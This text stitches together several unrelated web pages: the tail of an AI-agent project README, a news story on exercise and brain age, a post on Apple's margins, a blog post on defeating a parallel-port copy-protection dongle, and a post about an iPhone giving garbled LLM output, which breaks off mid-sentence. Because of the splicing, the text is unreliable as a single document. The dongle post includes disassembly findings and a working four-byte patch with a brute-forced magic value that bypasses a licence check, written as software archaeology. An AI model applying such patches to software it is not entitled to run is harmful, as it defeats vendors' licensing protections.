<li><code>/add-telegram</code> - Add Telegram as channel. Should give the user option to replace WhatsApp or add as additional channel. Also should be possible to add it as a control channel (where it can trigger actions) or just a channel that can be used in actions triggered elsewhere</li>
<li><code>/add-slack</code> - Add Slack</li>
<li><code>/add-discord</code> - Add Discord</li>
</ul>
<p dir="auto"><strong>Container Runtime</strong></p>
<ul dir="auto">
<li><code>/convert-to-docker</code> - Replace Apple Container with Docker (unlocks Linux)</li>
</ul>
<p dir="auto"><strong>Platform Support</strong></p>
<ul dir="auto">
<li><code>/setup-windows</code> - Windows via WSL2 + Docker</li>
</ul>
<p dir="auto"><strong>Session Management</strong></p>
<ul dir="auto">
<li><code>/add-clear</code> - Add a <code>/clear</code> command that compacts the conversation (summarizes context while preserving critical information in the same session). Requires figuring out how to trigger compaction programmatically via the Claude Agent SDK.</li>

<p dir="auto"><h2 tabindex="-1" dir="auto">FAQ</h2><a id="user-content-faq" aria-label="Permalink: FAQ" href="#faq"></a></p>
<p dir="auto"><strong>Why WhatsApp and not Telegram/Signal/etc?</strong></p>
<p dir="auto">Because I use WhatsApp. Fork it and run a skill to change it. That's the whole point.</p>
<p dir="auto"><strong>Why Apple Container instead of Docker?</strong></p>
<p dir="auto">Lightweight, fast, and built into macOS. Requires macOS Tahoe and runs great on a Mac Mini. Contribute a skill to convert to Docker if you want Docker.</p>
<p dir="auto"><strong>Can I run this on Linux?</strong></p>
<p dir="auto">Yes. Run Claude Code and say "make this run on Linux." ~30 min of back-and-forth and it'll work. When you're done, ask Claude to create a skill explaining how to make it work on Linux, then contribute the skill back to the project.</p>
<p dir="auto"><strong>Is this secure?</strong></p>
<p dir="auto">Agents run in containers, not behind application-level permission checks. They can only access explicitly mounted directories. You should still review what you're running, but the codebase is small enough that you actually can. See <a href="https://github.com/gavrielc/nanoclaw/blob/main/docs/SECURITY.md">docs/SECURITY.md</a> for the full security model.</p>
<p dir="auto"><strong>Why no configuration files?</strong></p>
<p dir="auto">We don't want configuration sprawl. Every user should customize it to so that the code matches exactly what they want rather than configuring a generic system. If you like having config files, tell Claude to add them.</p>
<p dir="auto"><strong>How do I debug issues?</strong></p>
<p dir="auto">Ask Claude Code. "Why isn't the scheduler running?" "What's in the recent logs?" "Why did this message not get a response?" That's the AI-native approach.</p>
<p dir="auto"><strong>Why isn't the setup working for me?</strong></p>
<p dir="auto">I don't know. Run <code>claude</code>, then run <code>/debug</code>. If claude finds an issue that is likely affecting other users, open a PR to modify the setup SKILL.md.</p>
<p dir="auto"><strong>What changes will be accepted into the codebase?</strong></p>
<p dir="auto">Security fixes, bug fixes, and clear improvements to the base configuration. That's it.</p>
<p dir="auto">Everything else (new capabilities, OS compatibility, hardware support, enhancements) should be contributed as skills.</p>
<p dir="auto">This keeps the base system minimal and lets every user customize their installation without inheriting features they don't want.</p>

<div id="readability-page-1" class="page"><p id="first">Looking after your brain is something that happens over many years, and new findings from the AdventHealth Research Institute point to an encouraging option. Researchers report that sticking with a consistent aerobic exercise routine may help the brain remain biologically younger. This effect could support clearer thinking, better memory, and overall mental well-being.</p><div id="text">
<p>The research showed that adults who committed to a full year of aerobic exercise had brains that appeared almost one year younger than those of participants who did not change how active they were.</p>
<p><strong>Measuring Brain Age With MRI</strong></p>
<p>Published in the <em>Journal of Sport and Health Science</em>, the study examined whether regular aerobic exercise could slow or even reverse what scientists call "brain age." Brain age is estimated using magnetic resonance imaging (MRI) and reflects how old the brain appears compared to a person's actual age. A higher brain-predicted age difference (brain-PAD) means the brain looks older, and earlier studies have linked this measure to weaker physical and cognitive performance and a higher risk of death.</p>
<p>"We found that a simple, guideline-based exercise program can make the brain look measurably younger over just 12 months," said Dr. Lu Wan, lead author and data scientist at the AdventHealth Research Institute. "Many people worry about how to protect their brain health as they age. Studies like this offer hopeful guidance grounded in everyday habits. These absolute changes were modest, but even a one-year shift in brain age could matter over the course of decades."</p>
<p><strong>Inside the Year-Long Exercise Trial</strong></p>
<p>The clinical trial included 130 healthy adults between the ages of 26 and 58. Participants were randomly assigned to either a moderate-to-vigorous aerobic exercise group or a usual-care control group. Those in the exercise group completed two supervised 60-minute workout sessions each week in a laboratory and added home-based exercise to reach roughly 150 minutes of aerobic activity per week. This schedule matched the physical activity guidelines set by the American College of Sports Medicine.</p>


<p>Researchers measured brain structure using MRI scans and assessed cardiorespiratory fitness through peak oxygen uptake (VO2peak) at the start of the study and again after 12 months.</p>
<p><strong>Exercise Linked to a Younger Looking Brain</strong></p>
<p>After one year, clear differences emerged between the two groups. Participants who exercised showed a measurable decrease in brain age, while those in the control group showed a slight increase. On average, the exercise group saw their brain-PAD drop by about 0.6 years, meaning their brains looked younger at the end of the study. The control group's brains appeared about 0.35 years older, a change that was not statistically significant. When compared directly, the gap between the two groups was close to one full year in favor of the exercise group.</p>
<p>"Even though the difference is less than a year, prior studies suggest that each additional 'year' of brain age is associated with meaningful differences in later-life health," said Dr. Kirk I. Erickson, senior author of the study and a neuroscientist and director at AdventHealth Research Institute and the University of Pittsburgh. "From a lifespan perspective, nudging the brain in a younger direction in midlife could be very important."</p>
<p><strong>Why Exercise May Affect Brain Aging</strong></p>
<p>To better understand why exercise influenced brain age, the research team looked at several possible factors. These included changes in physical fitness, body composition, blood pressure, and levels of brain-derived neurotrophic factor (BDNF), a protein that supports brain plasticity. Although fitness levels clearly improved with exercise, none of these factors statistically explained the reduction in brain-PAD seen in the trial.</p>


<p>"That was a surprise," Wan noted. "We expected improvements in fitness or blood pressure to account for the effect, but they didn't. Exercise may be acting through additional mechanisms we haven't captured yet, such as subtle changes in brain structure, inflammation, vascular health or other molecular factors."</p>
<p><strong>Focusing on Midlife for Long-Term Benefits</strong></p>
<p>Many studies on exercise and brain health focus on older adults, after age-related changes have already become more pronounced. This trial took a different approach by targeting people in early to mid-adulthood, when brain changes are harder to detect but prevention may offer greater benefits over time.</p>
<p>"Intervening in the 30s, 40s and 50s gives us a head start," Erickson said. "If we can slow brain aging before major problems appear, we may be able to delay or reduce the risk of later-life cognitive decline and dementia."</p>
<p><strong>What the Findings Mean Going Forward</strong></p>
<p>The authors caution that the study involved healthy, relatively well-educated volunteers and that the changes in brain age were modest. They note that larger studies and longer follow-up periods are needed to learn whether these reductions in brain-PAD lead to lower risks of stroke, dementia, or other brain-related diseases.</p>
<p>"People often ask, 'Is there anything I can do now to protect my brain later?'" Erickson said. "Our findings support the idea that following current exercise guidelines -- 150 minutes per week of moderate-to-vigorous aerobic activity -- may help keep the brain biologically younger, even in midlife."</p>

<p>While the commentariat assumes the worst, Apple delivers the best.</p>



<p>Last quarter Apple delivered a gross margin of 48.2%. This was above the high end of their guidance range and up 100 basis points sequentially. Management commented that this was “driven by favorable mix and leverage.”</p>



<p>Further, products gross margin was 40.7%, up 450 basis points sequentially, driven by favorable mix and leverage. Services gross margin was 76.5%, up 120 basis points sequentially, driven by mix.</p>



<p>This performance is even more astonishing considering the history shown below. Apple is quite simply, delivering at the highest gross and net margins in its history. </p>



<figure><a href="https://asymco.com/wp-content/uploads/2026/02/image-5.png"><img fetchpriority="high" decoding="async" width="620" height="539" src="https://asymco.com/wp-content/uploads/2026/02/image-5-620x539.png" alt="Line graph depicting Apple's profit margins over time, including Gross Margin, Operating Margin, Net Margin, Product Margin, and Services Margin percentages, with data spanning from 2010 to 2023." srcset="https://asymco.com/wp-content/uploads/2026/02/image-5-620x539.png 620w, https://asymco.com/wp-content/uploads/2026/02/image-5-440x383.png 440w, https://asymco.com/wp-content/uploads/2026/02/image-5.png 731w" sizes="(max-width: 620px) 100vw, 620px"></a></figure>



<p>Note that the graph actually projects forward one quarter because we have the following guidance: “We expect gross margin to be between 48-49%.” The graph reflects the high end of this guidance range.</p>



<p>So what’s going on?  Especially as a drumbeat of constant doom is being broadcast by pundits. The conference call itself seemed to be dedicated to margins. It became what I call the Margin Call. </p>



<p>Amit Daryanani, the first questioning analyst, specifically kicked off with the following:</p>



<blockquote>
<p>“there is a lot of focus on the impact of memory to host the companies, and I would love to kind of get your perspective when you are first guiding gross margins up into March. Talk about, a, your comfort in securing the bit that you need for shipment and b, how do we think about memory inflation flowing through Apple’s model over time?”</p>
</blockquote>



<p>Tim Cook answered: </p>



<blockquote>
<p>We are currently constrained, and at this point, it is difficult to predict when supply and demand will balance. The constraints that we have are driven by the availability of the advanced nodes that our SoCs are produced on. And at this time, we are seeing less flexibility in the supply chain than normal, partly because of our increased demand that I just spoke about. From a memory point of view, to answer your question, <strong>memory had a minimal impact on Q1. So the December gross margin. We do expect it to be a bit more of an impact on the Q2 gross margin, and that was comprehended in the outlook of 48 to 49% that Kevin gave earlier</strong>.</p>
</blockquote>



<p>what Apple is saying is that they are constrained by production of silicon but not of memory. They do see some impact in the future but that is included in a guidance of <strong>margin expansion</strong>. </p>



<p>Analysts still could not believe this, the following exchange soon followed:</p>



<blockquote>
<p><strong>Ben Reitzes</strong>: So the next question is on gross margin. I am pretty shocked I gotta hand it to you, Tim. I am, you know, that you are able to do 48 to 49. What is really going on there? How are you doing that with this memory, the NAND prices? Is it due to mix that there is a good less hardware and more services? Services and services margins are going up. How are you doing it to keep it at 48 to 49?</p>



<p><strong>Kevan Parekh</strong>: Yeah, Ben. This is Kevin. [] Let me start maybe by just reflecting on the Q1 gross margin. I think we talked about the fact that we landed at 48.2%, so just above the high end of the range we provided, [], on the last call. [] if you look at that performance, [], we were up 100 basis points sequentially. We talked about the fact that we had favorable mix. [], as you know, when we have a good product cycle, strong price cycle we are seeing for iPhone, that does lend itself to a bit more favorable opportunity on the [] leverage side.</p>



<p>So we are having a strong iPhone cycle as Tim outlined. And so that also translates itself. So we talked about products sequentially went up by 450 basis points. So I think, in general, I think we are just seeing, [], favorable mix dynamics as well. [], service continues to contribute as well. That business is growing, [], double digits, so that also is a contributor. And I think that, [], if you looked at our guidance, [], we are providing a similar range to where we reported in December. There are going to be a few puts and takes. [], we do expect to see favorable mix in the services.</p>



<p>As you know, when we move from Q1 to Q2, that tends to be the case, and that is partly offset by a seasonal loss leverage. So there will be puts and takes, but again, we feel pretty good about the guide of 48 to 49%, which is similar to the range we reported in December.</p>
</blockquote>



<p>Still not enough. Two more questions followed on margin. I will quote one here.  </p>



<blockquote>
<p><strong>Aaron Rakers</strong>: Yep. And then as a quick follow-up, you know, kind of tied to memory, maybe not so much, but part of this current generation iPhone cycle is you clearly deepened some of your own internal silicon capabilities on the device. I am curious if that if we should think about that as a lever and maybe a supportive factor to gross margin that might be underappreciated and any thoughts on where we go from here as far as continual opportunities of internalizing your own silicon? Thank you.</p>



<p><strong>Timothy D. Cook</strong>: Yeah. I will let Kevin talk about the gross margin. But in terms of the product, which is at the heart of what we think about in the user, Apple silicon has just been an incredible game changer for us. Starting with iPhone and then on iPad and, of course, the Mac as of a few years ago. And so we believe it is a game changer and a major advantage.</p>



<p><strong>Kevan Parekh</strong>: Yeah. And as far as impact on gross margin, yeah, we have been, as you know, investing in core technologies like our own silicon and our own modem. And certainly, while those do provide opportunities for cost savings and can be plugged in margins, they also importantly provide, [], the differentiation that is really important for our products as well and us more control of our roadmap. So I think there is a lot of strategic value to it, but also we are seeing, [], investments in our core technologies impacting, [], gross margin in a positive way.</p>
</blockquote>



<p>After all this, the financial commentariat continues to assume that Apple will be hit with margin pressure from memory and that has presumably been affecting the share price since the call.</p>



<p>Well, we’ve seen all this before. Before the great memory crisis Apple was going to be constrained by tariffs, by China, by developer dissatisfaction, by AI, by regulators, etc.</p>



<p>The feeling one gets is that Apple is always navigating through a minefield of pitfalls and gotchas. The opposite is true. It’s highly likely that Apple has sufficient leverage which increases its access to supply and that everyone is keen to work with the company. Leverage comes from scale, from lead time, from vertical integration and from engineering. Management is saying as much. Indeed, the evidence of leverage across the supply chain and over the entire ecosystem and economy is evident in its margin expansion story told in the graph above. </p>

<p>That’s right — this little device is what stood between me and the ability to run an <em>even older</em> piece of software that I recently unearthed during an expedition of software archaeology.</p>
<p>For a bit more background, I was recently involved in helping a friend’s accounting firm to move away from using an <em>extremely</em> legacy software package that they had locked themselves into using for the last four decades.</p>
<p>This software was built using a programming language called <a href="https://en.wikipedia.org/wiki/IBM_RPG">RPG</a> (“Report Program Generator”), which is older than COBOL (!), and was used with IBM’s midrange computers such as the System/3, System/32, and all the way up to the AS/400. Apparently, RPG was subsequently ported to MS-DOS, so that the same software tools built with RPG could run on personal computers, which is how we ended up here.</p>
<p>This accounting firm was actually using a Windows 98 computer (yep, in 2026), and running the RPG software inside a DOS console window. And it turned out that, in order to run this software, it requires a special hardware copy-protection dongle to be attached to the computer’s parallel port! This was a relatively common practice in those days, particularly with “enterprise” software vendors who wanted to protect their very important™ software from unauthorized use.</p>
<p><img decoding="async" src="https://dmitrybrant.com/images/20260105204921.jpg" alt="image"></p>
<p>Sadly, most of the text and markings on the dongle’s label has been worn or scratched off, but we can make out several clues:</p>
<ul>
<li>The words “Stamford, CT”, and what’s very likely the logo of a company called “Software Security Inc”. The only evidence for the existence of this company is this record of them exhibiting their wares at <a href="https://history.siggraph.org/exhibitor/software-security-inc/">SIGGRAPH conferences</a> in the early 1990s, as well as several <a href="https://patentimages.storage.googleapis.com/e6/69/0e/9f00041c0a3840/US5337357.pdf">patents</a> issued to them, relating to software protection.</li>
<li>A word that seems to say “RUNTIME”, which will become clear in a bit.</li>
</ul>
<p>My first course of action was to take a disk image of the Windows 98 PC that was running this software, and get it running in an emulator, so that we could see what the software actually does, and perhaps export the data from this software into a more modern format, to be used with modern accounting tools. But of course all of this requires the hardware dongle; none of the accounting tools seem to work without it plugged in.</p>
<p>Before doing anything, I looked through the disk image for any additional interesting clues, and found plenty of fascinating (and archaeologically significant?) stuff:</p>
<p><img decoding="async" src="https://dmitrybrant.com/images/w98rpg.png" alt="image"></p>
<ul>
<li>We’ve got a compiler for the RPG II language (excellent!), made by a company called Software West Inc.</li>
<li>Even better, there are <em>two versions</em> of the RPG II compiler, released on various dates in the 1990s by Software West.</li>
<li>We’ve got the complete source code of the accounting software, written in RPG. It looks like the full accounting package consists of numerous RPG modules, with a gnarly combination of DOS batch files for orchestrating them, all set up as a “menu” system for the user to navigate using number combinations. Clearly the author of this accounting system was originally an IBM mainframe programmer, and insisted on bringing those skills over to DOS, with mixed results.</li>
</ul>
<p>I began by playing around with the RPG compiler in isolation, and I learned very quickly that it’s the RPG compiler itself that requires the hardware dongle, and then the compiler automatically injects the same copy-protection logic into any executables it generates. This explains the text that seems to say “RUNTIME” on the dongle.</p>
<p>The compiler consists of a few executable files, notably <code>RPGC.EXE</code>, which is the compiler, and <code>SEU.EXE</code>, which is a source editor (“Source Entry Utility”). Here’s what we get when we launch SEU without the dongle, after a couple of seconds:</p>
<p><img decoding="async" src="https://dmitrybrant.com/images/seu1.png" alt="image"></p>
<p>A bit rude, but this gives us an important clue: this program must be trying to communicate over the parallel port over the course of a few seconds (which could give us an opportunity to pause it for debugging, and see what it’s doing during that time), and then exits with a message (which we can now find in a disassembly of the program, and trace how it gets there).</p>
<p>A great tool for disassembling executables of this vintage is <a href="https://github.com/uxmal/reko">Reko</a>. It understands 16-bit real mode executables, and even attempts to decompile them into readable C code that corresponds to the disassembly.</p>
<p><img decoding="async" src="https://dmitrybrant.com/images/rekorpg3.png" alt="image"></p>
<p>And so, looking at the decompiled/disassembled code in Reko, I expected to find <code>in</code> and <code>out</code> instructions, which would be the telltale sign of the program trying to communicate with the parallel port through the PC’s I/O ports. However… I didn’t see an <code>in</code> or <code>out</code> instruction anywhere! But then I noticed something: Reko disassembled the executable into two “segments”: <code>0800</code> and <code>0809</code>, and I was only looking at segment <code>0809</code>.</p>
<p><img decoding="async" src="https://dmitrybrant.com/images/rekorpg2.png" alt="image"></p>
<p>If we look at segment <code>0800</code>, we see the smoking gun: <code>in</code> and <code>out</code> instructions, meaning that the copy-protection routine is definitely here, and best of all, the entire code segment is a mere 0x90 bytes, which suggests that the entire routine should be pretty easy to unravel and understand. For some reason, Reko was not able to decompile this code into a C representation, but it still produced a disassembly, which will work just fine for our purposes. Maybe this was a primitive form of obfuscation from those early days, which is now confusing Reko and preventing it from associating this chunk of code with the rest of the program… who knows.</p>
<p>Here is a GitHub Gist with the <a href="https://gist.github.com/dbrant/1d1a9ba2a2a41d5ba7be50ccb3d36d6c">disassembly of this code</a>, along with my annotations and notes. My x86 assembly knowledge is a little rusty, but here is the gist of what this code does:</p>
<ul>
<li>It’s definitely a single self-contained routine, intended to be called using a “far” <code>CALL</code> instruction, since it returns with a <code>RETF</code> instruction.</li>
<li>It begins by detecting the address of the parallel port, by reading the <a href="https://wiki.osdev.org/Memory_Map_(x86)#BIOS_Data_Area_(BDA)">BIOS data area</a>. If the computer has more than one parallel port, the dongle must be connected to the <em>first</em> parallel port (LPT1).</li>
<li>It performs a loop where it writes values to the data register of the parallel port, and then reads the status register, and accumulates responses in the <code>BH</code> and <code>BL</code> registers.</li>
<li>At the end of the routine, the “result” of the whole procedure is stored in the <code>BX</code> register (<code>BH</code> and <code>BL</code> together), which will presumably be “verified” by the caller of the routine.</li>
<li>Very importantly, there doesn’t seem to be any “input” into this routine. It doesn’t pop anything from the stack, nor does it care about any register values passed into it. Which can only mean that the result of this routine is <em>completely constant</em>! No matter what complicated back-and-forth it does with the dongle, the result of this routine should always be the same.</li>
</ul>
<p>With the knowledge that this routine must exit with some magic value stored in <code>BX</code>, we can now patch the first few bytes of the routine to do just that! Not yet knowing which value to put in <code>BX</code>, let’s start with 1234:</p>
<pre><code>BB 34 12       MOV BX, 1234h
CB             RETF
</code></pre>
<p>Only the first four bytes need patching — set <code>BX</code> to our desired value, and get out of there. Running the patched executable with these new bytes still fails (expectedly) with the same message of “No dongle, no edit”, but it fails immediately, instead of after several seconds of talking to the parallel port. Progress!</p>
<p>Stepping through the disassembly more closely, we get another major clue: The only value that <code>BH</code> can be at the end of the routine is 76h. So, our total value for the magic number in <code>BX</code> must be of the form 76xx. In other words, only the <code>BL</code> value remains unknown:</p>
<pre><code>BB __ 76       MOV BX, 76__h
CB             RETF
</code></pre>
<p>Since <code>BL</code> is an 8-bit register, it can only have 256 possible values. And what do we do when we have 256 combinations to try? Brute force it! I whipped up a script that plugs a value into that particular byte (from 0 to 255) and programmatically launches the executable in DosBox, and observes the output. Lo and behold, it worked! The brute forcing didn’t take long at all, because the correct number turned out to be… <em>6</em>. Meaning that the total magic number in <code>BX</code> should be 7606h:</p>
<pre><code>BB 06 76       MOV BX, 7606h
CB             RETF
</code></pre>
<p><img decoding="async" src="https://dmitrybrant.com/images/seu2.png" alt="image"></p>
<p>Bingo!<br>
And then, proceeding to examine the other executable files in the compiler suite, the parallel port routine turns out to be <em>exactly the same</em>. All of the executables have the exact same copy protection logic, as if it was rubber-stamped onto them. In fact, when the compiler (<code>RPGC.EXE</code>) compiles some RPG source code, it seems to copy the parallel port routine from itself into the compiled program. That’s right: the patched version of the compiler will produce executables with the same patched copy protection routine! Very convenient.</p>
<p>I must say, this copy protection mechanism seems a bit… simplistic? A hardware dongle that just passes back a constant number? Defeatable with a four-byte patch? Is this really worthy of a patent? But who am I to pass judgment. It’s possible that I haven’t fully understood the logic, and the copy protection will somehow re-surface in another way. It’s also possible that the creators of the RPG compiler (Software West, Inc) didn’t take proper advantage of the hardware dongle, and used it in a way that is so easily bypassed.</p>
<p>In any case, Software West’s RPG II compiler is now free from the constraint of the parallel port dongle! And at some point soon, I’ll work on purging any PII from the compiler directories, and make this compiler available as an artifact of computing history. It doesn’t seem to be available anywhere else on the web. If anyone reading this was associated with Software West Inc, feel free to get in touch — I have many questions!</p>

				<h2 id="tldr">TL;DR:</h2><p>My iPhone 16 Pro Max produces garbage output when running MLX LLMs. An iPhone 15 Pro runs the same code perfectly. A MacBook Pro also runs the same code perfectly. The tensor outputs on the 16 show numerical values an order of magnitude wrong. I suspect it points to a hardware defect in the Neural Engine or some other ML-needed system.</p><p>It was a PITA to debug, but at least I got a blog post out of it.</p><h2 id="how-did-i-get-there">How did I get there?</h2><p>This was supposed to be a simple, unwinding-time project.</p><p>For the past few months I've been working on a <s>Clawdbot</s> Moltbot clone that I've been calling Schmidt. It basically does the same kind of thing but with a custom chat UI instead of using Telegram, WhatsApp or other "I-can't-afford-to-be-banned-from" Service. This project has been consuming early days and late nights, so, to unwind, I decided that it may be a good idea to do something simpler. Since I recently subscribed to MiniMax M2.1, I thought I would do what many do and build a simple expense tracking app to test out the model.</p><p>The core functionality is simple: </p><ul><li>Automatically, upon each payment, add the expense to my app</li><li>Update an Apple Watch complication with the % of my monthly budget spent</li><li>Categorize the purchase for later analysis</li></ul><p>This all comes from being basically orphaned by Nubank's amazing native app (since replaced by a less-full-featured Flutter version).</p><figure><img src="https://journal.rafaelcosta.me/content/images/2026/01/original-39c7e1f432c4bda26535fd3e0b5cb7d5.webp" alt="" loading="lazy" width="752" height="564" srcset="https://journal.rafaelcosta.me/content/images/size/w600/2026/01/original-39c7e1f432c4bda26535fd3e0b5cb7d5.webp 600w, https://journal.rafaelcosta.me/content/images/2026/01/original-39c7e1f432c4bda26535fd3e0b5cb7d5.webp 752w" sizes="(min-width: 720px) 720px"><figcaption><span>Something like that, I can't find the original complication itself. Apparently, this was designed by </span><a href="https://dribbble.com/gneumann?ref=journal.rafaelcosta.me" rel="contact"><span>Guilherme Neumann</span></a><span>&nbsp;(according to their Dribbble)</span></figcaption></figure><p>Integrating with Shortcuts is manual, but reliable. Within 15 minutes I had a version of the app that could register purchases. The Apple Watch complication, the main goal, can come later. I'd rather get the classification feature, which should be easy, done quickly – so I figured.</p><h2 id="apple-intelligence">Apple Intelligence</h2><p>Given the new LLM-bonanza we've been living through, it's no surprise that Apple has their own set of APIs developers such as me can use. Reading up on the documentation, it's a matter of checking for the availability of the feature and then asking the model to either reply to a textual query or, in my case, categorize a request.</p><p>MiniMax raced through it in a single prompt and then I ran it on my iPhone. First expense was a purchase at a shop called "Kasai Kitchin", classified as... <code>unknown</code>.<br>Weird.</p><p>Checking the logs, it was clear: the model support was downloading. The feature hadn't been enabled. Again, weird. I should have it on. Anyway, I go into settings, do the weird dance of toggling it on and off – sadly, that's not surprising on Apple's services. Maybe my Settings.app got stuck in a weird state, who knows? – and wait for it to download.</p><figure><img src="https://journal.rafaelcosta.me/content/images/2026/01/Screenshot-2026-01-28-at-01.14.46.png" alt="" loading="lazy" width="1320" height="971" srcset="https://journal.rafaelcosta.me/content/images/size/w600/2026/01/Screenshot-2026-01-28-at-01.14.46.png 600w, https://journal.rafaelcosta.me/content/images/size/w1000/2026/01/Screenshot-2026-01-28-at-01.14.46.png 1000w, https://journal.rafaelcosta.me/content/images/2026/01/Screenshot-2026-01-28-at-01.14.46.png 1320w" sizes="(min-width: 720px) 720px"></figure><p>After 4h I realized it was not going anywhere. Looking it up, it seems that many have the same issue (<a href="https://discussions.apple.com/thread/255822364?answerId=261482678022&amp;sortBy=rank&amp;page=12&amp;ref=journal.rafaelcosta.me#261482678022">this</a> thread shows 12 pages of frustrated users). Again, not a surprise for Apple's services recently.</p><p>Oh well, time to give up on the Apple Intelligence approach. Let's move on to the next one.</p><h2 id="mlx-llm">MLX LLM</h2><p>Well, the iOS framework engineers don't seem to be the only engineers at Apple capable of coming up with Machine Learning APIs in Swift. Apparently, there's a whole separate way of doing it – with models downloaded to your app. Not great for the user's storage, but great for me!</p><p>Again, MiniMax does it in a heartbeat, specially after being given documentation and one or two Medium posts. Time to run on my iPhone and... gibberish.</p><p>The CPU spins to 100% and the model starts generating. But it's all gibberish. And no "stop" token is generated, so this goes on for long.</p><figure><img src="https://journal.rafaelcosta.me/content/images/2026/01/Screenshot-2026-01-28-at-02.09.49.png" alt="" loading="lazy" width="2000" height="605" srcset="https://journal.rafaelcosta.me/content/images/size/w600/2026/01/Screenshot-2026-01-28-at-02.09.49.png 600w, https://journal.rafaelcosta.me/content/images/size/w1000/2026/01/Screenshot-2026-01-28-at-02.09.49.png 1000w, https://journal.rafaelcosta.me/content/images/size/w1600/2026/01/Screenshot-2026-01-28-at-02.09.49.png 1600w, https://journal.rafaelcosta.me/content/images/2026/01/Screenshot-2026-01-28-at-02.09.49.png 2322w" sizes="(min-width: 720px) 720px"><figcaption><span>"What is 2+2?" apparently "Applied.....*_dAK[...]" according to my iPhone</span></figcaption></figure><p>At this point, the only explanation is: I'm completely incompetent and can't even get a simple "ready made" framework to execute what I want. Or, rather, <strong>MiniMax is</strong>! The good thing about offloading your work to an LLM is that you can blame it for your shortcomings. Time to get my hands dirty and do it myself, typing code on my keyboard, like the ancient Mayan and Aztec programmers probably did.</p><h2 id="my-own-mlx-implementation">My own MLX implementation</h2><div><p>I went back to the documentation, to the Medium posts and, much to my surprise: MiniMax had followed it to the letter. Even went back to some deprecated methods of generation and it also was gibberish. And now there's no one to blame, but myself. I go to work everyday and this impostor-syndrome inducing problem silently consumes me. </p><p>After 3 days of trying to get it to work, I'm ready to give up...<br>...until, on a Tuesday morning, at 7-8 AM, I have an idea: let me, just in case, run this on my old iPhone 15 Pro. Up to this point, I was running it on my daily driver, an iPhone 16 Pro Max that was a replacement phone sent by Apple Care after a small clubbing mishap (in which my iPhone was irreparably crashed). I rush to get everything ready before it's time to go to work and: it works! Gemma, Qwen, and all other models generate coherent responses!</p></div><p>I stop and think: this cannot be a hardware issue,<em> right</em>? Of course not. The iPhone 15 is still running iOS 18. The iPhone 16 is running 26. It <strong><em>must be an OS issue</em></strong>. Well, time to be late for my work standup and update the old phone. The curiosity is too much. Many minutes later... same results, now on iOS 26. The plot is thickening.</p><h2 id="finding-the-smoking-gun-breakpoints-in-mlxs-implementations-of-gemma">Finding the smoking gun: breakpoints in MLX's implementations of Gemma</h2><p>After that work day, and after many lunch and coffee discussions with coworkers about the sources of my troubles, I get home and immediately set myself on debugging MLX as it runs, if possible. The game plan is:</p><ul><li>Use a known-to-be-reliable model, that fits in RAM (I went with quantized Gemma)</li><li>Use a simple prompt, in my case "What is 2+2?"<ul><li>To be <em>really</em> pedantic: the prompt was <code>&lt;start_of_turn&gt;user\nWhat is 2+2?&lt;end_of_turn&gt;\n&lt;start_of_turn&gt;model</code></li></ul></li><li>Run everything with temperature set to <code>0.0</code> – maybe that's enough to remove variability</li><li>Find the model implementation</li><li>Find where the model iterates through the layers and</li><li>Print out the MLXArray/Tensor with the values on each layer as the input goes through</li></ul><p>A few moments later and I find where I need to be. Added the breakpoints, added the logs and off to the races.</p><figure><img src="https://journal.rafaelcosta.me/content/images/2026/01/Screenshot-2026-01-27-at-18.28.38.png" alt="" loading="lazy" width="1892" height="1186" srcset="https://journal.rafaelcosta.me/content/images/size/w600/2026/01/Screenshot-2026-01-27-at-18.28.38.png 600w, https://journal.rafaelcosta.me/content/images/size/w1000/2026/01/Screenshot-2026-01-27-at-18.28.38.png 1000w, https://journal.rafaelcosta.me/content/images/size/w1600/2026/01/Screenshot-2026-01-27-at-18.28.38.png 1600w, https://journal.rafaelcosta.me/content/images/2026/01/Screenshot-2026-01-27-at-18.28.38.png 1892w" sizes="(min-width: 720px) 720px"><figcaption><span>These ones were the ones I added</span></figcaption></figure><p>I run it on my iPhone 16 Pro Max. The model loads and the prompt is "What is 2+2?". The tensors start printing out, line after line after line. For once, the logs aren't <em>complete</em> gibberish – they're numbers. Floating point values representing the model's internal state as it processes the input. I save the output to a file and do the same on my iPhone 15 Pro. Same model, same prompt, same code. Time to compare.</p><h2 id="welp-now-its-definitely-out-of-my-expertise">Welp, now it's definitely out of my expertise</h2><div><p>I grep for a pattern I know should be consistent – an array at log-line 58, right before the values get normalized/softmaxed. On a working device, I hypothesize this should be the same every time.</p><p>On the iPhone 15 Pro:<br><code>3: "[[[[53.875, 62.5625, -187.75, ..., 42.625, 6.25, -21.5625]]]]"</code><br>On the iPhone 16 Pro Max:<br><code>3: "[[[[191.5, 23.625, 173.75, ..., 1298, -147.25, -162.5]]]]"</code></p><p>Huh. Not close. Not at all. These values are orders of magnitude off. I double check the start of the logs and both phones show the same:<br><code>1: "array([[[0.162842, -0.162842, -0.48877, ..., -0.176636, 0.0001297, 0.088501],\n [-0.348633, -2.78906, 0, ..., 0.84668, 0, -1.69336],\n [-1.30957, 1.57324, -1.30957, ..., -0.0010376, -0.0010376, 1.12305],\n ...,\n [-0.348633, -2.78906, 0, ..., 0.84668, 0, -1.69336],\n [0.296875, 0.59375, 0.890625, ..., -0.59375, 0.296875, -0.890137],\n [1.02734, -0.616211, -0.616211, ..., -0.275879, -0.551758, 0.275879]]], dtype=float16)"</code></p></div><p>OK, so the model receives the same thing as input, but at some point, the values start to go off. Like, <strong><em>way off</em></strong>. In order to make sure I'm not crazy, I do one last thing: run the same thing on my Mac. Make the app run on iPad compatibility mode and...<br><code>3: "[[[[53.875, 62.5625, -187.75, ..., 42.625, 6.25, -21.5625]]]]"</code></p><p><strong>Bingo! Same as iPhone 15!</strong></p><p>The model isn't broken. The code isn't broken. Most importantly, I'm not broken*. My <strong>phone</strong> is broken.<br>*arguable, but besides the point here</p><h2 id="whats-going-on">What's going on?</h2><p>Let me explain what I think it's going on here: the iPhone 16 Pro Max contains Apple's A18 chip with its Neural Engine—a specialized accelerator for machine learning operations. MLX uses Metal to compile tensor operations for this accelerator. Somewhere in that stack, the computations are going <strong>very</strong> wrong. I don't think it's a widespread issue but, I do get disappointed that a relatively newly replaced iPhone from Apple Care came with such an issue.</p><p>However, if my Apple Intelligence troubles are related – and they might as well be, I'd assume that code and MLX are not dissimilar in operations being done –, it could be that <a href="https://discussions.apple.com/thread/255822364?answerId=261482678022&amp;sortBy=rank&amp;page=12&amp;ref=journal.rafaelcosta.me#261482678022">all the 12 pages of users</a> are users in a similar dillema, but without the means of debugging it.</p><h2 id="what-now">What now?</h2><p>I spent 3 days thinking I was incompetent. I blamed MiniMax. I blamed myself. The entire time, my $1,400 phone had a broken hardware. I could lose more time 